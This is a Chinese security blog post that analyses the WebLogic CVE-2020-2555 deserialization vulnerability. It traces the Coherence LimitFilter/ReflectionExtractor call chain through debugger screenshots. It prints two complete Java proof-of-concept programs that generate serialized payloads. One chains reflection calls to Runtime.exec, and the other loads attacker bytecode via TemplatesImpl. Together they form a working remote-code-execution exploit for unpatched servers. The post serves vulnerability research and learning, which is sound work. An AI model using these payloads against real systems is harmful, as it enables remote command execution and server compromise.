# CVE-2020-2555 调用链复现分析 - tr1ple - 博客园

> 原文：[`www.cnblogs.com/tr1ple/p/12564457.html`](https://www.cnblogs.com/tr1ple/p/12564457.html)

## 本文首发于先知社区：[`xz.aliyun.com/t/7417`](https://xz.aliyun.com/t/7417)

### 0x01 前言

　　该洞主要针对 weblogic 的 coherence.jar 中存在能够实现反序列化 gadget 构造的类，并且经过 T3 协议接收的数据经过反序列化处理后将导致漏洞的产生，这篇文章主要详细记录调试学习 CVE-2020-2555 的过程，并分享一个区别于公开 poc 的利用 TemplateImpl 类实现单次反射进行 rce 的例子。

### 0x02 通信过程

网上公布的 poc 如下:

```
package T3;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class exp {
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException {
        String cmd = "calc";
        //定义多次转换链进行反射调用
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getMethod", new Object[]{
                        "getRuntime", new Class[0]
                }),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{new String[]{"cmd", "/c", cmd}})
    };
        //初始化 LimitFiler 类实例
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(Runtime.class);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);
        //将 limitFilter 放入 BadAttributeValueExpException 的 val 属性中
        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        //生成序列化 payload
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(System.getProperty("user.dir")+"/javasec-weblogic/src/main/resources/poc.ser"));
        objectOutputStream.writeObject(expException);
        objectOutputStream.close();
    }
} 
```

本地测试环境为 weblogic 版本为 12.1.3.0.0+jdk1.8.0，运行 weblogic_t3.py 通过 t3 协议发送序列化的 payload
![image.png](img/c7fbd9a50b34305f9edfaaf86944fd07.png)
在 idea 中添加调试需要的 jar 包后，直接找到 LimitFilter 的 tostring 方法，并下断点再次发送 poc 即可，此时 wireshark 抓包也可看到具体的通信数据
![image.png](img/fa7b54c4d487b7590f7c59525679f343.png)
![image.png](img/424ac7ef7f82c2aa8f696d72ec55c90b.png)
其中 weblogic_t3.py 中先向 weblogic 发送了 T3 协议头的数据包，然后再读取序列化数据进行发送。那么在数据中查找序列化的魔术头部 ac ed 00 05 可以发现出现多处，首先说明 weblogic 的 t3 协议输出序列化数据用的是 jre 的原生 ObjectOutputStream，和 IIOP 协议是不同的，并且实际上 exp 实际上发送了多个部分的序列化数据，其中多段序列化数据以 fe 01 00 00 隔开，从数据包中可看到我们的序列化 payload 实际上是作为第一段反序列化数据插入其中，插入其他位置也可以，具体可以参考[修复 weblogic 的 JAVA 反序列化漏洞的多种方法](http://drops.xmd5.com/static/drops/web-13470.html),这篇文章关于如何构造 weblogic 序列化数据也说得非常详细。
![image.png](img/0a78a7a5c09b24546dc8eeafa633719e.png)

### 0x03 调用链分析

首先调用 ServerChannelInputStream(其父类为 ObjectInputStream)的构造方法将 MsgAbbrevInputStream 转为 ObjectInputStream，接着再调用 readObject 即为调用 jre 原生的反序列化的 ObjectInputStream.readObject()
![image.png](img/9827c0c5f6b3f4815507c02930e53c24.png)
![image.png](img/f40ed4d99950200de2e4ade1bfd1e5b8.png)
那么很显然接下来将一路走到 BadAttributeValueExpException 的 readObject 方法，那么在 ysoserial 的 CommonsCollections5 的 gadget 最外层的入口即为该类，该类的 readObject 函数中在 security manager 为 null 的情况下将调用该类 val 成员属性的 tostring 方法，那么在该漏洞中就到了 weblogic 的 coherence.jar 包的 com/tangosol/util/filter/LimitFilter 类，也就是之前下的断点处
![image.png](img/318a8dfe6067fc9d9954709d72b1c8e2.png)
那么在该漏洞中就到了 weblogic 的 coherence.jar 包的 com/tangosol/util/filter/LimitFilter 类，也就是之前下的断点处
![image.png](img/0097579492484a11965d7d030b376237.png)
那么接下来将获取到该类的 m_comparator 成员属性，并调用其 extract 函数,因为反序列化数据是可控的，因此这里 this.m_oAnchorTop 成员属性也为可控
![image.png](img/cb76f402a9982a516105533fc7146529.png)
网上公开的 poc 中说的都是这里用到的为 ChainedExtractor
![image.png](img/81c0dff1e44a433110f2478f624fe064.png)
其 extract 方法和 ysoserial 中的 ChainedTransformer 的 transform 方法有着相似之处，chained 从字面意思上来理解就是其肯定存在一个为数组类型的成员属性保存一组 Extractor 来依次调用其 extract 函数，并将调用结果返回
![image.png](img/8acd167113814aade9af21b879d0b766.png)
那么转换链又是通过调用 getExtractors()方法得到，该属性即为 m_aExtractor 属性，其可控
![image.png](img/23fce9c701b2dd683809b886bf8e3488.png)
那么在 poc 中 chainedExtractor 中存放的为 coherence.jar 中的 com/tangosol/util/extractor/ReflectionExtractor 类的实例
![image.png](img/f218d1f2ce6ada54c299eb459943c26a.png)
从类名字的就可以隐约猜出该类应该和 java 的反射机制相关，其 extract 函数中也正是实现了任意方法的调用，其中方法名 this.m_sMethod 和对应的参数值 this.m_aoParam 都是可控的
![image.png](img/a70a64db380f919549df1c48f59dff4f.png)
那么在 poc 中第一次传入的 class 类型的 java.lang.Runtime
![image.png](img/1be820691d4426251ee7ee5ded0a91de.png)
那么和 CommonsCollections1 中用到的 transfrom 函数作用相似，因为这里 this.m_methodPrev 为 null，因此调用 this.getMethodName()返回 this.m_sMethod 存储的方法(即为 getMethod)，所以第一步反射调用 Runtime 类的 getmethod 方法返回 Method 类型的 getruntime 方法
![image.png](img/884aaebfa7583d01c51c59a656be306d.png)
那么在反射调用时因为已经有了 Method 类型的 getruntime 方法，那么只需再反射调用 invoke 函数即可返回 Runtime 类的实例，那么此时 this.m_sMethod 的存储即为 invoke 函数
![image.png](img/3aad5d64a7df3895e27c5a12f4214810.png)
那么第三次进入 extract 函数只需反射调用 Runtime 实例的 exec 方法就可以执行命令了，那么此时 this.m_sMethod 存储的即为 exec，那么调用链至此已经结束了
![image.png](img/69cbc93c2ee8f13c79e783eb4c49e029.png)
![image.png](img/421132b1b9a911fd684ea418af7905df.png)

### 0x04 单次反射 rce 链

poc2：

```
package T3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import javassist.*;
import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class exp {
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, NotFoundException, CannotCompileException, ClassNotFoundException {
        //初始化 TemplatesImpl 实例
        TemplatesImpl temp = new TemplatesImpl();
        ClassPool pool =  ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass payload = pool.get(T3.payload.class.getName());
        byte[] PayByte = payload.toBytecode();
        //将 payload 字节码放入 _bytecodes 属性
        Class clz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field ByteCode = clz.getDeclaredField("_bytecodes");
        ByteCode.setAccessible(true);
        ByteCode.set(temp,new byte[][]{PayByte});
        //_name 不为空即可
        Field name = clz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(temp,"tr1ple");

        String cmd = "calc";
        //定义单次反射要调用的方法
        ValueExtractor valueExtractor = new ReflectionExtractor("getOutputProperties", new Object[0]);
        //构造 LimitFilter 实例，并将 temp 放入
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(temp);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, valueExtractor);

        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, temp);

        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(System.getProperty("user.dir")+"/javasec-weblogic/src/main/resources/poc.ser"));
        objectOutputStream.writeObject(expException);
        objectOutputStream.close();
    }
} 
```

该 poc 构造起来也比较容易，既然 extrat 方法可以反射调用任意方法，并且 extract 入口参数也是可控的，因此可以改造一下现有的 chained 转换链，结合 TemplatesImpl 这个类，该类是 jdk 的内置类，在打 fastjson 和 ysoserial 的 gadget 构造中都用到过，该类的有两个方法 getOutputProperties 和 newTransformer 都可以触发实例化其成员属性的`_bytecodes`中存储的字节码以便于实现 rce，那么经过改造后我们不再需要 chainedExtractor 的多次反射，只需要 ReflectionExtractor 进行一次反射即可
![image.png](img/8e8b69f2453dab5c026c96a4cda13f39.png)

#### 参考

*   [`xz.aliyun.com/t/7387`](https://xz.aliyun.com/t/7387)
*   [`drops.xmd5.com/static/drops/web-13470.html`](http://drops.xmd5.com/static/drops/web-13470.html)